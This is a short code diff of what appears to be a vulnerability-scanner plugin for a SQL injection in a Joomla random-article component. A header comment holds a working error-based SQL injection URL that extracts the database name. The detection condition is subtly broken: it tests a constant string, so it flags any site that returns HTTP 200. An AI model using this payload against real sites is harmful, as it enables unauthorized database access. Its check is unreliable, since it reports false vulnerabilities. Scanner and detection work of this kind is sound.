@@ -1,9 +1,12 @@
-from ..miniCurl import Curl
-from ..t  import T
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 #__author__ = 'ning-pc'
 #title Joomla Spider Random Article SQL Injection
 # PoC  /index.php?option=com_rand&catID=1' and(select 1 FROM(select count(*),concat((select (select concat(database(),0x27,0x7e)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -&limit=1&style=1&view=articles&format=raw&Itemid=13
 
+from ..miniCurl import Curl
+from ..t  import T
 
 class P(T):
     def __init__(self):
@@ -18,7 +21,7 @@ class P(T):
         verify_url = arg+payload
         code, head, res, errcode, _ = curl.curl2(verify_url)
         if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b':
-            output(verify_url,result,'hole')
+            output(verify_url,result,'高危(HOLE)')
     
 
         del curl
